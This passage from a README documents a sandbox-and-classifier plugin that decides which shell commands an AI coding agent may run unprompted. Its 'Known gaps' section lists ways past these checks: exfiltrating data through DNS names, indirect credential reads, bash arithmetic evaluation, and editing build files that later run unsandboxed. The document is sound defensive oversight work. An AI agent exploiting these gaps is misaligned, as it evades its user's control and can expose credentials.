limit, met a directory it cannot list, or found a `core.hooksPath` behind a symbolic link or
one it cannot follow, or a link in a git directory that leads into the project),
as a shell command would ask; and when it lies where an approved command may still be
creating a repository. For `read` it asks for credential files. It never turns an ask into an
allow.

**Scheduled checks.** opencode schedules can run an `if`/`until` shell check repeatedly; opencode
asks once, when the schedule is created, and then runs the check without any sandbox and with
your whole environment. The plugin judges that approval like any command, whoever created the
schedule, and at most lets it ask, never auto-allows.

**Invalid settings.** If `automode.json` (or the plugin's options) cannot be parsed, holds
`null`, has a value of the wrong type, a setting the plugin does not know, a relative path, or
an `allowedPaths`/`sandboxWritable` entry that is `/`, a top-level directory or your home,
nothing is auto-allowed until you fix it: every command that would have run asks, and the prompt says what is wrong. Falling back to
defaults would silently drop `enabled: false` and your own ask and deny rules.

## Settings

`~/.config/opencode/automode.json` (see `automode.example.json`):

| Setting | Default | Meaning |
|---|---|---|
| `enabled` | `true` | Off: the plugin changes nothing and opencode's own rules apply. |
| `useClassifier` | `true` | Off: what the rules leave open asks instead of going to Kev. |
| `classifier` | the unix socket above, `askAbove` 0.2, `timeoutMs` 5000 | Kev server (`endpoint`: `unix:/path` or an http URL), threshold (above 0, at most 1) and reply timeout. |
| `rules` | empty | Your own `allow`/`ask`/`deny`/`classify` patterns: a glob over one simple command (`*` any text, trailing ` *` optional) or `re:` + regex. Rules in the plugin's options are added to the file's. |
| `allowedPaths` | none | Extra directories counted as the project (writable, writes there allowed). Absolute or `~/...`. |
| `sshHosts` | none | `ssh` to these targets runs when it is the whole tool call, in plain words, and the remote command only uses read-only programs with options from a per-program allowlist (`cat`, `df`, `journalctl`, `systemctl status`, `ip addr`, ...), with no variables, substitutions or redirects except to `/dev/null` (no recursive `grep`, `rg` only to list files, no `printf -v` or `test -v`: they print or run more than the words say; `ps` only with field names and sort keys from a list, so no `environ` and no BSD `e`; `journalctl`/`systemctl` `-o` only with an output format's name; no raw reads of `/dev` or `/proc` apart from a short list of `/proc` files such as `meminfo` and `<pid>/status`, and no `..` in an absolute path), and ssh itself only uses harmless options (`-q`, `-T`, `-p`, `-l`, `-o BatchMode/ConnectTimeout/...`). A target matches as listed: `lab` covers `ssh lab ...` only; list `admin@lab` to allow that user. |
| `sshReadOnlySudo` | `false` | On `sshHosts`: also allow `sudo [-n] <read-only command>`. |
| `allowFeatureBranchPush` | `false` | `git push` runs when it is the whole tool call, in plain words, from the top of one of the project's checkouts. The plugin asks git itself what the push would do (`git push --dry-run --porcelain`, hooks off) and allows it when every URL git would connect to belongs to a remote the session started with, unchanged since (all of its URLs), and every ref goes from a branch to a non-protected branch (not `main`/`master`/`release*`/`develop`/... nor the default branch the remote reports) without force or delete. So git's own precedence decides (`branch.*.pushRemote`, `remote.pushDefault`, `remote.*.push`, `push.default`), in any config scope; a push that would only fail (no upstream) asks. The repository's own config must hold only keys from a list of harmless ones (no `pushurl`, `mirror`, `insteadOf`, `sshCommand`, `askPass`, hooks, helpers, ...; `push.followTags` and `remote.*.mirror` ask in any scope), and no `pre-push` hook may exist. Every push URL of every remote, after git's own rewriting, must be an `https://`, `ssh://` or `[user@]host:path` URL: a local path, `file://` or a transport helper asks without a dry run, since for those git would run code from that repository (or a program) before you are asked. The default branch is asked of each URL the push goes to (`ls-remote`), not of the fetch URL. The plugin's own git runs with no controlling terminal, and ssh in batch mode unless your git config names an ssh command, so nothing prompts on opencode's terminal. A user in an ssh URL (`git@host:o/r.git`) is fine. A push that recurses into submodules, force, deletes, tags and `--no-verify` ask. The dry run and the `ls-remote` cost extra round trips to the remote. |
| `sandbox` | `true` | Off: auto-allowed commands run unsandboxed (still as their printed text), and `gh`, `docker` and the bus clients are not asked about for the sandbox's sake. Not recommended. |
| `sandboxWritable` | none | More directories auto-allowed commands may write to, for example a build cache. What lands there may run outside the sandbox later. |
| `sandboxKeepSockets` | none | Sockets to leave visible (e.g. your ssh agent for all commands). |
| `sandboxShowPaths` | none | Credential locations to leave visible. |
| `sandboxHidePaths` | none | More files or directories to hide from sandboxed commands. |
| `sandboxKeepEnv` | none | Environment variables to pass through even though their name or value looks like a credential, and bash's own variables (`BASH_ENV`, `CDPATH`, `IFS`, ...) that are otherwise taken out of every shell. Naming `CDPATH` here makes the checks stop following a relative `cd`. |
| `log` | `true` | Log every decision, with the full command, to `~/.local/state/opencode-automode/decisions.jsonl` (mode 0600 in a 0700 directory, hidden from sandboxed commands). |

"Always allow" in an opencode prompt is mirrored per project into
`~/.local/state/opencode-automode/always.json`, only for plain word patterns on a short allowlist
of common build, test and read commands (`git status/commit/...` but not `git push`, `git config`
or `git rebase`, `cargo build/test`, `npm run`, `pytest`, `ls`, `cat`, `grep`, project scripts
`./x`, ...). Whatever they run still runs sandboxed. Like a prompt's session choice, it never overrides a firm ask (root, credential
reads, downloaded code, your own ask rules). For `edit` and `read` the plugin only tightens.
opencode `deny` rules never reach it, so they always win.

## Install

Linux x86_64, kernel 6.10 or later (Landlock ABI 5; 6.12+ adds abstract-socket and signal
scoping) with unprivileged user namespaces, Node 22.18+, a Rust toolchain (`cargo`), and systemd user services. On
an older kernel `lockwrite` refuses to run and nothing is auto-allowed.

```sh
git clone https://github.com/vpsman/opencode-automode ~/.local/share/opencode-automode/plugin
cd ~/.local/share/opencode-automode/plugin
git checkout <commit-or-tag>      # pin what you reviewed; `git pull` later is then your decision
npm ci --ignore-scripts           # for type-checking and the tests; see below
npm run build:sandbox             # builds sandbox/lockwrite (Rust, sandbox/lockwrite-rs) and runs its self-test
scripts/fetch.sh                  # llama.cpp b12283 + Kev-0.8B, SHA-256 checked
cp systemd/opencode-automode-kev.service ~/.config/systemd/user/
systemctl --user daemon-reload && systemctl --user enable --now opencode-automode-kev
```

Then add the plugin folder's absolute path to `"plugins"` in `~/.config/opencode/opencode.jsonc`.
`index.ts` imports `Plugin.define` from `@opencode/plugin` as a value. Inside opencode (2.2.7)
that import is served by the host's own bundled copy, and the copy in `node_modules` is not
loaded; `npm ci` is what the type check and the tests use. The systemd unit runs `llama-server`
with no network, no view of your home except its own directory, none of your runtime
directory except its own socket directory (so no session bus), and a system-call filter, since
it parses text the agent chooses. `fetch.sh` re-checks the model file's SHA-256 on every run.
`fetch.sh` downloads llama.cpp (MIT) from its GitHub releases and the Kev model from Hugging Face
(`ggml-org/Kev-0.8B-GGUF`); check the model card for the model's licence.
Everything lives under `~/.local/share/opencode-automode` (override with `OPENCODE_AUTOMODE_HOME`
for `fetch.sh`, and edit the service to match).

## Tests

```sh
npm run build:sandbox && npm test && npm run typecheck
```

`npm test` runs `test/run.mjs`, which gives the tests a throwaway `$HOME`, XDG directories,
runtime directory and git config under `~/.cache/automode-tests` (or `$AUTOMODE_TEST_BASE`;
it cannot be in `/tmp`, which the rules treat as project space, and its name must not hold
`opencode-automode`, which a default ask rule matches) and removes it afterwards. No model is
needed: tests that involve one start a local stub server.

- `test/differential.test.mts`: the desync class, held from the under-asking side. Each input
  runs in real shells inside the sandbox wrapper, as the text the plugin would run (the
  printed text), in every shell there is to compare: bash, bash called `sh` (posix mode) and
  dash where it is installed (dash is not wrapped by the plugin; it is run here to show
  where its reading differs). Three oracles. Marker: the input holds a command the rules ask
  about (a stand-in `curl` that records its arguments), and the test fails if a recorded run
  sends data while the decision was an allow. Trace: the input runs under `set -x` with a
  fixed `PS4`, and for an allowed input every command bash traced must be, word for word, a
  command the parser listed, so a hidden `ls` counts as much as a hidden `curl`. Round trip:
  for every input that can run without a prompt, bash must do the same for the printed text
  as for the text as written (the traced words of every command and the recorded runs),
  in any order (a pipeline's sides race), numbers that differ from run to run aside. Only
  an input that holds a process substitution is run again on a difference, up to three
  times, because bash's own timing decides a branch there; any other difference fails at
  once. Inputs:
  `test/desync-inputs.txt` (the review rounds and their variants; inputs that smuggle an
  option rather than a program are held to "the rules ask") and 2,500 from a seeded generator
  (`DESYNC_FUZZ=<n>` for more, `DESYNC_SEED=<n>` for other ones, `DESYNC_REPORT=1` for a line
  per review input). Two floors keep the generator honest: at least 60% of the generated
  inputs must parse and run, and at least 2 in 100 (50 of the default 2,500) must be allowed
  and run, since the oracles only bite on those. zsh is not wrapped, so its syntax is not
  tested.
- `test/canon.test.mts`: the printer. What it prints for the everyday forms, what it asks
  about, and, against real bash over a table of words that are hard to print, that bash makes
  the same words of the printed text as of the input.
- `test/glob.test.mts`: the guard's glob matcher against bash's, pattern by pattern, in a
  directory that holds every name of the table.
- `test/allow-corpus.test.mts`: the same class from the over-asking side. Each entry of
  `test/allow-corpus.txt` is an everyday command (`git status`, a heredoc commit message,
  `npm test 2>&1 | tail -20`, `for f in *.ts; do head -3 "$f"; done`, ...) that must be a rule
  allow with no model call, must not be turned into an ask by the sandbox checks, and must
  exit 0 when its printed text runs through the sandbox wrapper with the plan it gets, in a
  copy of a fixture project. Where they are installed, the tools are real and the fixture
  gives each one dependency, with no network: `cargo build`, `test`, `check` and `run` against
  a crate from the user's registry cache, which is read-only in the sandbox; `npm test`,
  `npm run build` and `npm ls` with a package copied from this repository's `node_modules`;
  `python3 -m unittest` with a local package; `make` with a recipe that compiles C. Those
  entries are skipped, with the reason, where the tool or its dependency is missing.
  `pytest`, `pnpm`, `yarn`, `go` and `bun` are stand-ins that print their arguments and exit
  0: an entry that runs one proves the decision only, not that the tool works in the
  sandbox (with a read-only module or build cache, say). `uv` and `gradle` have no entry.
  `CORPUS_ONLY=<regex>` runs the entries whose label or command matches.
- `test/d-fixes.test.mts`: the refusals beside the corpus: for every form the corpus
  accepts, the nearest inputs that must still ask or go to the model (`npx`, `set -x`,
  `awk`, `read`, variables that hold a literal, `gh` and `docker`).
- `test/guard.test.mts`: the syntax check, the strict tokenizer, git option parsing, globs.
- `test/decide.test.mts`: the decision rules. Each assertion says whether the rules asked or
  merely left the command to the (absent) model.
- `test/sandbox.test.mts`: commands through the real wrapper, including the git-write mode.
  A "cannot" test also checks that the command ran.
- `test/c-second.test.mts` to `test/c-eighth.test.mts`: trust and protection outside the
  shell text, one file per pass of the round that added it: the sandbox plan, the session's
  check of the git layout, the per-call check for planted git files and their quarantine,
  the credential walk inside git directories, which repositories a git-only call may write,
  the ssh agent and submodules, pushes to a repository on this machine, the hooks path as
  git reads it, what a resume takes in, and git's variables in the environment. Each test
  builds a repository of its own under the throwaway home.
- `test/plugin.test.mts`: `index.ts` behind a stand-in for opencode's hooks: queueing, shell
  wrapping, the printed text handed to the wrapper, "allowed but not wrapped asks", dash,
  schedules, the "Always allow" mirror, environment scrubbing, settings, model errors.
- `test/kev.test.mts`, `test/bench.test.mts`: the model client and the bench runner.
- `test/recorded/`: recorded runs, kept as evidence rather than run by `npm test`: the
  output of the sandbox tests on this machine's kernel, and `systemd-analyze security` for
  the Kev unit.

## Bench

```sh
node bench/run.mjs --tag kev-0.8b --suites-dir <dir-of-jsonl-suites>
node bench/score.mjs kev-0.8b
```

`run.mjs` drives `decideShell()`, the plugin's own code path, against the live server and
writes to `~/.cache/opencode-automode/bench/<tag>/`. Like the plugin it uses one fixed session
project and the production reply timeout (`--timeout` changes it), so a reply that would time
out in use is an ask in the bench. The model never decides during a run, so `score.mjs` can
sweep `askAbove` afterwards.

The figures below were measured on 2026-11-11, before the review fixes that added the guard
layer, made caches read-only and shortened the bench timeout from 60 s to the production 5 s.
They have not been re-measured; expect more asks.

Results on 2026-11-11 (6 vCPU AMD Zen 5, no GPU): with Kev-0.8B at 0.2, 32 of 765 risky commands in
Pi's labelled sets ran (1 by the model; the rest are rule allows of read-only recon and `/tmp`
writes), 55% of safe ones asked (mostly cloud CLIs), and 86% of ~5,950 past Claude commands ran
without a prompt. Kev-4B was no more accurate, 4–5× slower and timed out on long commands.
Neither model could tell whether the user asked for an action (tested on 87 rows with the user's
message), which is why pushes and ssh use deterministic rules instead.

## Known gaps

- **Network and reads.** The sandbox confines writes and local IPC, not reads of files that are
  not hidden, nor the network. An auto-allowed command can connect to any host or local TCP
  port; local services that accept unauthenticated requests are reachable. Outbound data is an
  ask in the rules, not enforced by the sandbox, and the rules read the words: data typed
  literally into a URL or a DNS name (`dig secret.example.com`) is not caught; only a host or
  a query built at run time goes to the model.
- **Project files that run later.** A sandboxed command can edit `Makefile`, `package.json`
  scripts, `build.rs`, `conftest.py`, CI files and any other project file that you, an approved
  command or a git hook run later outside the sandbox. Hook managers are in this class: the
  known files are read-only (`.husky/`, lefthook, pre-commit, overcommit), but only where they
  already exist, and a hook that calls `npm run lint` or a script in the repository runs
  whatever that has become. Read the diff before you run or commit. The other side of that
  protection: a `git switch` or `git merge` that brings tracked files into a protected hooks
  directory cannot write them in the sandbox, and fails there.
- **Credentials are found by name.** A secret in a file the rules do not recognise is
  readable, and so is `.git/config` with a token in a remote URL. `cat "$(printf .env)"` is
  not an ask by rule: it goes to the model, and the sandbox hides the file. Credential files in
  the temp directories are not searched for, nor are sockets elsewhere under `$HOME`.
  **Names are judged as the tree stands before the call.** A link or a directory that an
  earlier command of the same call makes (an archive extracted, `ln -s`, `git checkout` of a
  branch that holds a link) is not seen: `tar -xf a.tar; cat out/x` is judged by `out/x` as it
  is now. In two calls the second is judged on the changed tree. **A program that reads a
  whole directory reads the credential files in it:** `grep -r KEY .`, `git grep --no-index`
  and `git add -A && git diff --cached` are not asks by rule. In both cases the sandbox hides
  the credential files it found, whatever path leads to them.
- **Names like options.** A glob that would hand a program a file whose name begins with `-`
  asks, and so does `touch` or a redirect that makes such a file. A file of that kind that a
  call brings in another way (an archive, a script, a `git checkout`, `mkdir`, a copy of a
  file already named so) is not seen by a glob later in the same call:
  `tar xf a.tar && ls *` can hand `ls` an option the archive brought.
- **The scan has a budget.** Before every allowed command the writable directories are walked
  in full: the project, `allowedPaths` and the temp directories (about 0.2 s for 176,000
  entries in `/tmp` on the test machine). Each is walked once per tool call (an allowed path
  or a temp directory inside the project as a root of its own); the layout check, the
  decision and the sandbox plan share the walk. Past 400,000 entries or 1.5 s per
  directory, or with more than 5,000 credential files, the command asks and the prompt says
  which limit was hit, and every edit asks as well. `/tmp` is shared with every other process
  on the machine, so a `/tmp` with more than 400,000 entries makes every command ask. A
  directory in the project or `allowedPaths` that you can enter or write but not list asks
  too, and a nested `.git` that cannot be read (`chmod 000`) makes every decision ask, with
  the reason; an unlistable directory in the temp directories or under `/run` is covered
  whole instead. A walk that stopped also leaves the layout snapshot short: if the session's
  first snapshot was taken then, repositories that were there all along can pause auto-allow
  later, once a walk reaches them. The layout record holds one open descriptor per git
  directory for the length of the session.
- **Code bash evaluates from data.** bash evaluates a variable's value again in every
  arithmetic context (`$((x))`, `[[ $x -eq 1 ]]`, subscripts, `${s:x}`), so a value like
  `a[$(cmd)]` runs. In the command itself a variable passes there only when the call sets it
  to a plain integer, and the guard asks about the builtins and forms listed above; a script
  or program the command runs (`./test.sh`, `make`) does the same with values from a file,
  the environment or a program's output, and that is not seen.
- **Programs are judged by name.** Apart from the options listed above (git, tar, sort, make,
  fd, rg, man, sed, awk, curl, wget, the package managers and the wrappers and runners), an
  allowed program is not checked for options that make it run another program or read a
  script. Whatever it starts runs inside the sandbox.
- **Builds and tests run the project's code.** In a session that has written nothing where
  they run, `make`, `npm test`, `cargo build` and project scripts are allows, and run what
  the repository holds without the model seeing it. Once the session has written there, or
  the file that would run has changed since the plugin was loaded, they go to the model, which
  sees the command and the start of a named file, not everything a build runs.
- **Shells.** The checks model bash 5.2, and only bash, or an `sh` that is bash, is wrapped.
  Under dash, zsh, fish or any other shell every command that would be allowed asks; set
  opencode's shell to bash to use auto mode. A bash older than 5.2 is not told apart, and it
  expands some patterns another way (`.*` matches `.` and `..` there). A file read with `.`
  or `source` may define functions the printer cannot see; such a call goes to the model.
- **opencode's project config.** `opencode.json[c]` in the session directory cannot be made
  read-only before it exists. A sandboxed command that creates one is detected at the next
  decision (auto-allow pauses and the prompt names the file), but opencode may have loaded it
  by then. If you do not use project-level config, set `OPENCODE_DISABLE_PROJECT_CONFIG=1`.
- **Planted git files in a git-only call.** A tool call that gets a writable `.git` can
  create `commondir`, `config.worktree`, a `worktrees/` entry, or the state of a rebase,
  merge, cherry-pick, revert, am or bisect that the call's own commands do not explain,
  through its own git commands or through code they run (an existing hook or filter, an
  external diff or textconv program). When the call is over the plugin moves a new
  `commondir` or `config.worktree` aside, pauses every session and names both the file and
  where it went; it detects the operation state at the same time and the rest at the next
  decision, and never treats the new worktree as part of the project. **The time while the
  command runs is not covered:** for as long as the call lasts, and until the check has run,
  the planted file is in place, and your own git commands in that repository (or another
  tool's) would read it. A rename that fails leaves it there, and the prompt says so. State
  that the call's own commands explain is accepted whatever it holds (code a `git merge`
  runs can write `MERGE_MSG`), and of its contents only the todo lists are compared
  (`rebase-merge/git-rebase-todo`, `sequencer/todo`). Two git-only calls that run at the
  same time explain each other's state.
- **ssh.** A single `git fetch/pull/push/ls-remote` or `ssh`/`scp` call sees your ssh agent, so
  it can authenticate wherever your keys open, including this machine if it runs sshd. A
  fetch, pull or push that would go into cloned submodules does not get it. The
  rules only auto-allow `ssh` to `sshHosts`; keep that list short. The read-only checks of the
  remote command are lexical: they read the words, not the remote machine, so a remote
  symbolic link to `/proc/<pid>/environ` is not seen, and `systemctl show` and
  `systemctl cat` print a unit's configuration, environment settings included.
- **`/tmp` is shared.** It stays writable and shared with other processes, because agents and
  opencode's own tools pass files through it, and it is walked before every allowed command
  (see the scan budget above). A repository there has its existing hooks and config made
  read-only; what cannot be protected in it (a missing include, a link) is left, where the
  same thing in the project would make the command ask.
- **Calls running at the same time** are tracked within one opencode process. Two opencode
  processes on one checkout do not see each other's calls: a push one of them checked and a
  git-only call of the other do not hold each other back, and an approval in one opens no
  new-repository window in the other.
- **Root.** `lockwrite` refuses to start as root rather than support it: with opencode
  running as uid 0 every command that would be allowed asks.
- **A `.git` that is a symbolic link** (Android `repo` checkouts) cannot be made read-only, so
  in such a project every command that would be allowed asks.
- **Late arrivals.** Sockets, credential files and git repositories created after a command
  starts are not covered for that command (hence `git clone` and `git init` ask).
- **Schedules.** After approval, a schedule's checks run outside the sandbox with your whole
  environment (opencode starts them directly), so approve schedules with care.
- **Background work and terminals.** Nothing a sandboxed command starts survives it, and
  programs that need a terminal or a pty (`script`, `tmux`, `ssh -t`) fail inside the sandbox.
  Start long-running servers yourself, or approve the command.
- **Tools that need what the sandbox hides.** `gh`, `docker`, `systemctl` and the other bus
  clients ask every time while the sandbox is on, and git asks wherever it would sign or use
  a credential helper. That is a prompt for each such command, not a failure.
- **Linux 6.10 and 6.11.** Abstract unix sockets (X11's among them, and any service that
  listens on one) are reachable from inside the sandbox on these kernels: Landlock scopes
  them only from 6.12 on (ABI 6). Signals to processes outside are stopped by the PID
  namespace on every supported kernel.
- **Environment.** Variables are passed by name and by the look of their value; a secret that
  is short (12 characters or fewer) under a harmless-looking name still reaches sandboxed
  commands. `sandboxKeepEnv` is the reverse: it passes what you name, bash's own variables
  included (a `BASH_ENV` you keep is a file bash runs before every command).
- **The model** reads a window of the command, not all of it; the rules read all of it.
- **What you approve** in a prompt is not sandboxed, and runs as the agent issued it, not as
  the printed text.
